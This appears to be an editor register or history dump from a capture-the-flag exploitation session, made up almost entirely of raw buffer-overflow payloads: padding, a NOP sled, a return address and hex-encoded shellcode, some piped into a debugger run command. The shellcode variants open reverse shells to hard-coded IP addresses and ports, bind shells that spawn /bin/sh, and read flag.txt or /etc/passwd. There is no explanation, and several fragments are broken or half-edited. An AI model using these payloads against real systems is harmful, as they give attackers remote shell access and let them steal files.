	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x72\xf2\x03\x0a\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
771cc29affd6f431b1e36b15cbaaefe6|file:///home/neo/ccsc/guydebois/shellcode.txt|16|18|v|text
	"  // <- IP Number "127.1.1.1"
c6a6b30e21f9f87937365766d3f6518e|file:///home/neo/ccsc/guydebois/shellcode.txt|23|50|v|text
	"55555"
9312736add54b1c86356110ebeae666b|file:///home/neo/ccsc/guydebois/shellcode.txt|18|10|v|text
	"          // <- Port Number 
88323c1c7e4d9f1b10b8e5166e00dbc5|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	\x68\x0a\x03\xf2\x72\x5e\x66\x68\x82\x35\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce
a681a81a34db115df96d51627996fe3f|file:///home/neo/ccsc/guydebois/shellcode.txt|15|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x0a\x03\xf2\x72\x5e\x66\x68\x82\x35\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce"`
33a506353cc77d02eb0e2594890c3c4f|file:///home/neo/ccsc/guydebois/shellcode.txt|19|1|V|text
	\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5\xd3\x9e
21b4ca8fc1eddef724641547a2c292b6|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5\xd3\x9e"`
5bae4ac085798d5a54beb45a5f51a52e|file:///home/neo/ccsc/guydebois/shellcode.txt|17|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x12\x5b\x31\xc9\xb1\x75\x8a\x03\x34\x1e\x88\x03\x43\x66\x49\x75\xf5\xeb\x05\xe8\xe9\xff\xff\xff\x74\x78\x46\x74\x1f\x45\x2f\xd7\x4f\x74\x1f\x74\x1c\x97\xff\xd3\x9e\x97\xd8\x2f\xcc\x4c\x78\x76\x0f\x42\x78\x76\x1c\x1e\x97\xff\x74\x0e\x4f\x4e\x97\xff\xad\x1c\x74\x78\x46\xd3\x9e\xae\x78\xad\x1a\xd3\x9e\x4c\x48\x97\xff\x5d\x74\x78\x46\xd3\x9e\x97\xdd\x74\x1c\x47\x74\x21\x46\xd3\x9e\xfc\xe7\x74\x21\x46\xd3\x9e\x2f\xcc\x4c\x76\x70\x31\x6d\x76\x76\x31\x31\x7c\x77\x97\xfd\x4c\x78\x76\x33\x77\x97\xff\x4c\x4f\x4d\x97\xff\x74\x15\x46\xd3\x9e\x74\x1f\x46\x2f\xc5\xd3\x9e"
ea466c326deede9057d8ce54f1a4f54e|file:///home/neo/ccsc/guydebois/shellcode.txt|19|1|V|text
	\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05
143b9a17256f53ec660c608df3f79d84|file:///home/neo/ccsc/guydebois/shellcode.txt|19|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"`
6e61db9f56064ccbb7fbf522dc364429|file:///home/neo/ccsc/guydebois/shellcode.txt|19|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x11\x5c\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
71ecb3e88c17739b7708581518b0adf2|file:///home/neo/ccsc/guydebois/shellcode.txt|22|1|V|text
	\x68\xc0\xa8\x01\x2d\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05
a55872a5b8b8aec038e458f492d7df42|file:///home/neo/ccsc/guydebois/shellcode.txt|21|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x0a\x03\xf2\x72\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05
98fa5db3dba14d386628739891c25e5a|file:///home/neo/ccsc/guydebois/shellcode.txt|21|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x68\x0a\x03\xf2\x72\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"`
98c103f8b616808ecb9b69b5cf9d3f17|file:///home/neo/ccsc/guydebois/shellcode.txt|23|192|v|text
	\x68\x0a\x03\xf2\x72\x66\x68\x11\x5c\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05
08bd5f2e2b13ceee4044301460d52843|file:///home/neo/ccsc/guydebois/shellcode.txt|25|1|V|text
	x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag.txt\x00
aa35c534bec9c8223d6b01aa7a59431c|file:///home/neo/ccsc/guydebois/shellcode.txt|23|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag.txt\x00"`
aa2f46d2a6d506aff17d70d4606d98a5|file:///home/neo/ccsc/guydebois/shellcode.txt|27|1|V|text
	\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
d4fd9a3670318e891387769bcb714ca2|file:///home/neo/ccsc/guydebois/shellcode.txt|26|1|V|text
	666c61672e747874a
4c0e664293426939576d9637208bdfd8|file:///home/neo/ccsc/guydebois/shellcode.txt|25|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x4a\x87\x47\xe7\x67\x61\x6c\x66"`
10cd1e698fafa21194a20c56b4f07dfe|file:///home/neo/ccsc/guydebois/shellcode.txt|27|192|v|text
	\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x4a\x87\x47\xe7\x67\x61\x6c\x66
06cc9797efa70ed66e4a8ca09fa250d8|file:///home/neo/ccsc/guydebois/shellcode.txt|29|1|V|text
	\x31\xf6\xf7\xe6\x52\x48\xb9txt.galf\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05
2729fe711d284bdeb4cb1046f7562209|file:///home/neo/ccsc/guydebois/shellcode.txt|27|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xf6\xf7\xe6\x52\x48\xb9txt.galf\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05"`
3bcabda1892fdd60778e2725b07ca3f2|file:///home/neo/ccsc/guydebois/shellcode.txt|27|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xf6\xf7\xe6\x52\x48\xb9txt.gal\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05"`
76916ec3fd390ac47bdd0d996116b881|file:///home/neo/ccsc/guydebois/shellcode.txt|29|192|v|text
	\x31\xf6\xf7\xe6\x52\x48\xb9txt
16afbca03576729d0184c54fb4f4ff7c|file:///home/neo/ccsc/guydebois/shellcode.txt|29|191|v|text
	0galf\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05
d788e67e0df049483f3df69d6604a612|file:///home/neo/ccsc/guydebois/shellcode.txt|29|192|v|text
	galf\x51\x54\x5f\xb0\x02\x0f\x05\x50\x5f\x54\x5e\x52\x52\x52\x52\x58\x66\xba\x99\x09\x0f\x05\x5f\xff\xc7\x50\x5a\x58\xff\xc0\x0f\x05\x58\xb0\x3c\x0f\x05
f32f56fc2e719f837e04fd3716960d87|file:///home/neo/ccsc/guydebois/shellcode.txt|31|217|v|text
	\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64
5b9c5b11ff9dfcf14625513aa00b3ce3|file:///home/neo/ccsc/guydebois/shellcode.txt|31|1|V|text
	\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xfftxt.galf
5c211a31d329df082f6e4abd08fd0eab|file:///home/neo/ccsc/guydebois/shellcode.txt|29|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xfftxt.galf"`
9f47b445f9f7e35f4aee9cfc45dfc7de|file:///home/neo/ccsc/guydebois/shellcode.txt|33|1|V|text
	\xc7\x04\x24\x66\x6c\x61\x67\xc7\x44\x24\x04\x74\x78\x74\x2e\xc7\x44\x24\x08\x5c\x5c\x5c\x5c\xc7\x5c\x5c\x5c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
c89b9aaf045d99c323001e75f0f6c915|file:///home/neo/ccsc/guydebois/shellcode.txt|31|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24\x66\x6c\x61\x67\xc7\x44\x24\x04\x74\x78\x74\x2e\xc7\x44\x24\x08\x5c\x5c\x5c\x5c\xc7\x5c\x5c\x5c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"`
8b5aa109dd693f3083ee310a59600ced|file:///home/neo/ccsc/guydebois/shellcode.txt|31|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24\x66\x6c\x61\x67\xc7\x44\x24\x04\x2e\x74\x78\x74\xc7\x44\x24\x08\x5c\x5c\x5c\x5c\xc7\x5c\x5c\x5c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"`
91edf822adb3b3e0d15526e1dff7afd9|file:///home/neo/ccsc/guydebois/shellcode.txt|33|1|V|text
	\xc7\x04\x24.///\xc7\x44\x24\x04////\xc7\x44\x24\x08/fla\xc7\x44\x24\x0cg.tx\x6a\x78\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
21eefd2f5cc4f8e7d3d584c8ad49bbff|file:///home/neo/ccsc/guydebois/shellcode.txt|31|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24.///\xc7\x44\x24\x04////\xc7\x44\x24\x08/fla\xc7\x44\x24\x0cg.tx\x6a\x78\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"`
c4860e375efe631bdaa8733ea55ec25e|file:///home/neo/ccsc/guydebois/shellcode.txt|33|1|V|text
	\xc7\x04\x24.///\xc7\x44\x24\x04////\xc7\x44\x24\x08/fla\xc7\x44\x24\x0cg.tx\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
09c858fecf8d9e0dbed03896bafdd98a|file:///home/neo/ccsc/guydebois/shellcode.txt|31|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xc7\x04\x24.///\xc7\x44\x24\x04////\xc7\x44\x24\x08/fla\xc7\x44\x24\x0cg.tx\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05"`
6030e4d4bcdc358b5f2df014ab24aa30|file:///home/neo/ccsc/guydebois/shellcode.txt|33|1|V|text
	\xc7\x04\x24.///\xc7\x44\x24\x04////\xc7\x44\x24\x08/fla\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
